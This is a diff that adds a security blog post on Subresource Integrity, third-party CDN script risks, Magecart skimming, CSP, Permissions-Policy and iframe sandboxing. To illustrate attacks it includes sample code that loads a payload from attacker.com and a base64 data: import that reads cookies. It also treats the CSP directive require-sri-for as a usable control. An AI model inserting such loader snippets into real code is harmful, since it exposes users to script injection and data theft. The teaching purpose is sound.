@@ -1,0 +1,360 @@
+---
+title: "Subresource Integrity & Third-Party Script Trust"
+date: "May 2026"
+pubDate: 2026-05-26
+category: Security
+author: Honey Sharma
+summary: Every third-party script you load from a CDN extends your attack surface to include that CDN's entire security posture. SRI locks a script to a specific content hash — if the CDN is compromised and the file changes, the browser refuses to execute it. This post covers SRI, its limits, and what comes after it.
+tags: [security, sri, cdn, csp, permissions-policy, third-party, frontend]
+---
+import ArchFlow from '../../../components/mdx/ArchFlow.astro';
+import Terminal from '../../../components/mdx/Terminal.astro';
+import PacketDiagram from '../../../components/mdx/PacketDiagram.astro';
+import Comparison from '../../../components/mdx/Comparison.astro';
+import Callout from '../../../components/mdx/Callout.astro';
+import SequenceDiagram from '../../../components/mdx/SequenceDiagram.astro';
+import Lessons from '../../../components/mdx/Lessons.astro';
+import Lesson from '../../../components/mdx/Lesson.astro';
+
+DevForum loads its analytics library from a CDN:
+
+```html
+<script src="https://cdn.analytics.io/track.min.js"></script>
+```
+
+One Tuesday morning, a BGP route hijacking attack redirects traffic destined for `cdn.analytics.io` to an attacker-controlled server. (BGP — Border Gateway Protocol — is the system that determines which network path internet traffic takes. A misconfigured or malicious network operator can announce false routes that silently redirect traffic for a CDN's IP address to a different server entirely.) The server responds to every request for `track.min.js` with a modified file — the original analytics code plus a keylogger that captures every keystroke on every page that loads the script.
+
+DevForum's servers are fine. DevForum's code is unchanged. DevForum's database is untouched. But every user who visits DevForum that morning has their keystrokes recorded — including their passwords.
+
+The `<script>` tag is one line. The blast radius is every user on the site.
+
+---
+
+## How CDNs Extend Your Trust Boundary
+
+When you load a script from a CDN, you are implicitly trusting:
+
+- The CDN provider's infrastructure security
+- The CDN account holder's credentials and access controls
+- Every network path between the CDN and your users
+- The CDN's cache invalidation and poisoning protections
+
+A bug in any of these — a compromised CDN account, a BGP hijack, a cache poisoning attack — means your users execute whatever the CDN serves, with your site's full origin authority.
+
+**BGP hijacking** is the most technically sophisticated vector. BGP (Border Gateway Protocol) is the routing protocol that determines which network path traffic takes across the internet — think of it as the postal service's system of deciding which roads a letter travels, except the "roads" are network links between ISPs and data centres. A malicious or misconfigured network operator can announce false routes that redirect traffic for a CDN's IP range to a different server. The victim's DNS resolves correctly; the traffic takes a different physical path.
+
+**CDN account compromise** is the most common. The CDN account credentials are phished or credential-stuffed. The attacker uploads a modified version of the script and it propagates to CDN edge nodes within minutes.
+
+**Cache poisoning** exploits CDN caching logic to cause one user's response (containing a malicious payload) to be cached and served to other users.
+
+## What Subresource Integrity Does
+
+Subresource Integrity (SRI) addresses all three scenarios with the same mechanism: lock the `<script>` or `<link>` to the expected content hash. If the CDN serves a different file — for any reason — the browser refuses to execute it.
+
+```html
+<!-- Without SRI — executes whatever the CDN serves -->
+<script src="https://cdn.analytics.io/track.min.js"></script>
+
+<!-- With SRI — executes only if the file matches this exact hash -->
+<script
+  src="https://cdn.analytics.io/track.min.js"
+  integrity="sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="
+  crossorigin="anonymous"
+></script>
+```
+
+The `integrity` attribute contains an algorithm prefix (`sha256-`) and a base64-encoded hash. The browser downloads the file, computes the hash, and compares. If they match, the script executes. If not, the browser treats it as a network error — no execution, no partial execution, no fallback.
+
+## Generating SRI Hashes
+
+The hash is computed from the exact bytes of the file as it will be served. One extra byte, one different line ending — different hash.
+
+<Terminal
+  title="Generate SRI hash for a CDN script"
+  command="curl -s https://cdn.analytics.io/track.min.js | openssl dgst -sha256 -binary | openssl base64 -A"
+  output="47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="
+  language="openssl"
+/>
+
+The resulting `<script>` tag:
+
+```html
+<script
+  src="https://cdn.analytics.io/track.min.js"
+  integrity="sha256-47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU="
+  crossorigin="anonymous"
+></script>
+```
+
+Many CDNs generate the hash for you on their documentation page — look for a "Copy with SRI" button. [srihash.org](https://www.srihash.org/) generates hashes from a URL. For `<link rel="stylesheet">`, the process is identical.
+
+Multiple algorithms can be specified for forward compatibility:
+
+```html
+<script
+  src="https://cdn.analytics.io/track.min.js"
+  integrity="sha256-47DEQpj8HBSa... sha384-oqVuAfXRKap7fdgcCY..."
+  crossorigin="anonymous"
+></script>
+```
+
+The browser uses the strongest algorithm it supports.
+
+## The `crossorigin` Requirement
+
+SRI only works when the resource is fetched with CORS. The `crossorigin="anonymous"` attribute is mandatory — without it, the browser cannot read the response body to compute the hash in a cross-origin-safe context.
+
+<Callout type="warning" title="crossorigin=anonymous is not optional">
+  Without `crossorigin="anonymous"`, the browser fetches the script in no-CORS mode, cannot verify the hash, and — depending on the browser — may either silently execute the script or block it entirely. Both outcomes are worse than what SRI is supposed to provide. Always pair `integrity` with `crossorigin="anonymous"`.
+</Callout>
+
+This also means the CDN must send CORS headers (`Access-Control-Allow-Origin: *`) on the resource. Most major CDNs do. If a CDN does not send CORS headers, SRI cannot be used with it.
+
+## How the Browser Validates
+
+<ArchFlow
+  title="SRI Validation — From Request to Execute or Block"
+  direction="horizontal"
+  nodes={[
+    { label: "Browser", sublabel: "Has integrity attribute + crossorigin=anonymous" },
+    { label: "CDN Fetch", sublabel: "cdn.analytics.io — file downloaded" },
+    { label: "Hash Computed", sublabel: "SHA-256 of response bytes" },
+    { label: "Compare", sublabel: "computed hash vs integrity attribute" },
+    { label: "Execute / Block", sublabel: "match → executes  |  mismatch → network error" },
+  ]}
+/>
+
+When a mismatch occurs, the browser fires a `SecurityPolicyViolation` event and logs to the console:
+
+<PacketDiagram
+  title="Browser Console — SRI Mismatch Blocked"
+  rows={[
+    {
+      label: "Failed to load resource",
+      fields: [
+        { name: "URL",           value: "cdn.analytics.io/track.min.js",       color: "neutral", description: "The script src that was fetched" },
+        { name: "Reason",        value: "Integrity check failed",               color: "red",     description: "SHA-256 of received bytes did not match the integrity attribute", highlight: true },
+        { name: "Expected hash", value: "sha256-47DEQpj8HBSa…",                color: "green",   description: "Hash in the integrity attribute — what was expected" },
+        { name: "Got hash",      value: "sha256-Xk3KtVq9bZ2m…",                color: "red",     description: "Hash of the bytes actually received from the CDN" },
+        { name: "Disposition",   value: "blocked",                             color: "red",     description: "Script was not executed — browser treated this as a network error" },
+      ]
+    }
+  ]}
+  caption="The browser computed the hash of what it received and compared it to the integrity attribute. They didn't match — the CDN served a different file than the one the developer approved."
+/>
+
+## SRI Limitations and Blind Spots
+
+SRI is effective against a compromised CDN serving a different file at the same URL. It does not help in several important scenarios:
+
+**The `src` URL itself is attacker-controlled.** SRI locks content at a URL. If an attacker can change the `src` attribute — via XSS or a compromised build pipeline — they can point the tag at a URL they control with a matching hash. SRI validates the content, not the source of trust.
+
+**The malicious script was the version you hashed.** If the CDN was already serving malicious code when you generated the hash, you locked in the malicious version. This is less likely than a compromise-after-deployment scenario, but possible if the CDN account was already compromised before the library was pinned.
+
+**Dynamically injected scripts.** A script loaded with `document.createElement('script')` and a programmatically set `src` does not benefit from SRI — there is no `integrity` attribute in the DOM until you add it explicitly. Compromised third-party scripts often use this to load further payloads:
+
+```js
+// Inside a compromised analytics script — SRI cannot help here
+const s = document.createElement('script');
+s.src = 'https://attacker.com/payload.js';
+document.head.appendChild(s);
+```
+
+**The hash must be updated on every file update.** If the CDN updates the script (a new version, a hotfix), your hash no longer matches and the browser blocks the script. You must regenerate and redeploy the hash with every update.
+
+<Callout type="warning" title="SRI requires a deployment step on every CDN update">
+  When analytics.io releases a new version of their script, your SRI-protected `<script>` tag continues to pass the old hash — and blocks the new file until you update your HTML. Plan for this operationally: subscribe to release notifications from third-party CDN-hosted libraries, or use a hash auto-generation step in your build pipeline.
+</Callout>
+
+## The Magecart Attacks: Third-Party Scripts in Practice
+
+Magecart is a collective term for a series of attacks targeting e-commerce checkout pages by compromising the third-party scripts those pages load. The attack pattern:
+
+1. Identify a site that loads payment or analytics scripts from a third-party CDN
+2. Compromise the CDN account or script hosting (via credential theft, supply chain injection)
+3. Add a card-skimming payload to the script — one that reads payment form fields and exfiltrates them
+4. Wait for users to check out
+
+<SequenceDiagram
+  title="Magecart Attack — CDN Compromise Skims Every Checkout"
+  actors={[
+    { id: "attacker", label: "Attacker", variant: "malicious" },
+    { id: "cdn",      label: "Third-Party CDN", icon: "server" },
+    { id: "browser",  label: "Victim's Browser", icon: "browser" },
+    { id: "site",     label: "shop.example.com", icon: "server", variant: "trusted" },
+    { id: "c2",       label: "attacker.com", icon: "server", variant: "malicious" }
+  ]}
+  messages={[
+    { from: "attacker", to: "cdn",     label: "Compromises CDN credentials", sublabel: "Modifies analytics.js to include card-skimmer payload", type: "attack" },
+    { from: "browser",  to: "site",    label: "GET /checkout", type: "request" },
+    { from: "site",     to: "browser", label: "200 OK — page with <script src='cdn.example.com/analytics.js'>", type: "response" },
+    { from: "browser",  to: "cdn",     label: "GET /analytics.js", type: "request" },
+    { from: "cdn",      to: "browser", label: "Returns analytics.js + hidden skimmer payload", type: "response", highlight: true, annotation: "shop.example.com not compromised" },
+    { from: "browser",  to: "browser", label: "Skimmer reads card number, CVV, billing address", type: "note", annotation: "full origin authority" },
+    { from: "browser",  to: "c2",      label: "POST — card data exfiltrated silently", type: "attack" }
+  ]}
+  caption="The shop's own server was never touched. The attack came through a script the checkout page loaded unconditionally. SRI would have blocked analytics.js the moment the CDN's content changed."
+/>
+
+The payload runs with the full origin authority of the compromised site. It can read every form field, every DOM element, every cookie. British Airways (2018, ~500,000 customers' card data), Ticketmaster (2018), and hundreds of smaller e-commerce sites were affected.
+
+In every case, the site's own server was not compromised. The attack came through a script that the page trusted implicitly.
+
+<Callout type="danger" title="Every third-party script tag is a trust extension">
+  A `<script src="...">` is not a static include. It is a live connection to a third party's infrastructure that runs arbitrary code with your site's full origin authority — including access to every form field, every cookie, every DOM element. Treat adding a third-party script with the same due diligence as adding a new employee who has root access.
+</Callout>
+
+## The `data:` Exfiltration Gap
+
+Even a correctly configured SRI check does not prevent a compromised script from loading further payloads dynamically. Once a script executes, it can use `import()`, `fetch()`, `createElement('script')`, or `data:` URIs to pull in additional attacker-controlled code:
+
+```js
+// A compromised analytics script that passes SRI
+// (because you hashed this version)
+// Then proceeds to load a second-stage payload:
+
+(async () => {
+  const m = await import('data:text/javascript,'+atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ=='));
+})();
+```
+
+This technique bypasses SRI because:
+- The initial script matched its hash — it executed legitimately
+- The `import()` or `createElement('script')` is a runtime operation, not a static `<script>` tag
+- `data:` URIs do not have an integrity attribute to check
+
+This is why SRI alone is insufficient for high-risk third-party scripts. CSP `script-src` restrictions and `connect-src` limits on outbound fetches are the next layer.
+
+
+## Combining SRI with CSP
+
+CSP's `require-sri-for` directive forces every script and stylesheet on the page to carry an `integrity` attribute. Any resource without one is blocked:
+
+```http
+Content-Security-Policy: require-sri-for script style
+```
+
+This closes the gap where a developer adds a `<script>` tag without an integrity attribute — perhaps during a hotfix, or in a third-party tag manager. With `require-sri-for`, the browser blocks it immediately, making the missing integrity attribute a visible, immediate failure rather than a silent security regression.
+
+Combine with `script-src` to limit which domains can even attempt to serve scripts:
+
+```http
+Content-Security-Policy:
+  script-src 'nonce-{n}' 'strict-dynamic' cdn.analytics.io;
+  require-sri-for script;
+  connect-src 'self' api.devforum.com;
+```
+
+The `connect-src` restriction limits where scripts can make outbound network requests — blocking the exfiltration step even if a compromised script executes.
+
+## `Permissions-Policy`
+
+Beyond SRI and CSP, the `Permissions-Policy` header controls which browser APIs third-party scripts and iframes can access:
+
+```http
+Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=()
+```
+
+Each empty `()` means "no origin may use this API on this page." A compromised analytics script cannot silently activate the camera. A malicious payment widget cannot access geolocation data. The APIs are simply unavailable.
+
+Fine-grained control allows specific origins:
+
+```http
+Permissions-Policy:
+  payment=(self "https://checkout.stripe.com"),
+  geolocation=(),
+  camera=()
+```
+
+Only `self` and Stripe's checkout domain may use the Payment Request API. No other script on the page — regardless of how it was loaded — can invoke it.
+
+## Principle of Least Privilege for Third-Party Scripts
+
+SRI, CSP, and `Permissions-Policy` are reactive defences — they limit damage after a third-party script executes. The proactive approach is to limit what third-party scripts can access in the first place.
+
+**Sandboxed iframes.** Load third-party content inside a `<iframe sandbox>` — it gets its own browsing context with no access to the parent page's DOM, cookies, or localStorage:
+
+```html
+<iframe
+  src="https://widget.analytics.io/embed"
+  sandbox="allow-scripts allow-same-origin"
+  loading="lazy"
+></iframe>
+```
+
+The widget can run scripts and make same-origin requests within its own context. It cannot read `document.cookie` of the parent page. It cannot access parent `localStorage`. It cannot call `window.parent.document`.
+
+**Facade patterns.** For third-party embeds like chat widgets, video players, and social share buttons — load a static placeholder image or UI first. Only inject the actual third-party script when the user explicitly interacts with it:
+
+```js
+// Load the chat widget only when the user clicks the chat button
+document.getElementById('chat-btn').addEventListener('click', () => {
+  const script = document.createElement('script');
+  script.src = 'https://chat.provider.io/widget.js';
+  script.integrity = 'sha256-{hash}';
+  script.crossOrigin = 'anonymous';
+  document.head.appendChild(script);
+});
+```
+
+The script is never loaded for users who don't click the chat button. Those users are never exposed to the chat provider's attack surface.
+
+<Comparison
+  headers={["Mechanism", "What it protects against", "What it cannot protect against", "Where it runs"]}
+  rows={[
+    [
+      "Subresource Integrity",
+      "CDN compromise serving a different file at the same URL; BGP hijacking; cache poisoning",
+      "Dynamically injected scripts; malicious script you hashed; src URL attacker-controlled",
+      "Browser — at fetch time"
+    ],
+    [
+      "CSP script-src",
+      "Scripts from unapproved origins; inline scripts without nonce/hash",
+      "Scripts from approved origins that are themselves compromised; dynamic import()",
+      "Browser — at execution time"
+    ],
+    [
+      "CSP connect-src",
+      "Outbound network requests from scripts to unapproved destinations",
+      "data: URI exfiltration; approved destinations that are attacker-controlled",
+      "Browser — at fetch time (from script)"
+    ],
+    [
+      "Permissions-Policy",
+      "Third-party access to sensitive browser APIs: camera, mic, payment, geolocation",
+      "DOM access; cookie access; network requests — those require script-src / connect-src",
+      "Browser — API-level enforcement"
+    ],
+    [
+      "Sandboxed iframe",
+      "Third-party content accessing parent DOM, cookies, localStorage",
+      "Attacks within the iframe's own context; resource loading from the iframe",
+      "Browser — context isolation"
+    ],
+  ]}
+  caption="Combine all five for third-party scripts that carry significant risk — payment widgets, analytics on checkout pages, chat widgets with access to sensitive user data."
+/>
+
+---
+
+<Lessons title="Third-Party Script Security Checklist" type="recommendations">
+  <Lesson title="Add integrity + crossorigin=anonymous to every CDN script and stylesheet">
+    Generate the hash from the exact file you want to pin. Do this at build time where possible — not manually, because manual hashes drift. If a third-party CDN updates their script, you will know immediately when the browser blocks it.
+  </Lesson>
+  <Lesson title="Add require-sri-for to your CSP">
+    This turns missing integrity attributes into visible failures rather than silent regressions. Any new script tag added to the page without an integrity attribute — in a hotfix, in a tag manager — is blocked immediately. The operational pain is intentional.
+  </Lesson>
+  <Lesson title="Use connect-src to limit where scripts can exfiltrate data">
+    Even if a compromised script executes, restricting its outbound network access to approved origins limits the exfiltration step. Set connect-src to only the API endpoints your application legitimately uses.
+  </Lesson>
+  <Lesson title="Apply Permissions-Policy to every page that loads third-party content">
+    Start with the empty policy (deny all): camera=(), microphone=(), geolocation=(), payment=(). Add back only what your application genuinely uses, scoped to the minimum set of origins that need it.
+  </Lesson>
+  <Lesson title="Use sandboxed iframes for third-party widgets where possible">
+    Chat widgets, social embeds, video players, A/B testing tools — these are all candidates for iframe sandboxing. The iframe cannot access the parent page's DOM, cookies, or localStorage. The blast radius of a compromise is contained to the iframe's context.
+  </Lesson>
+  <Lesson title="Apply the facade pattern to non-critical third-party scripts">
+    If a user never interacts with the chat widget, they should never load the chat provider's script. Lazy-load third-party scripts on interaction. This reduces attack surface and improves performance at the same time.
+  </Lesson>
+</Lessons>
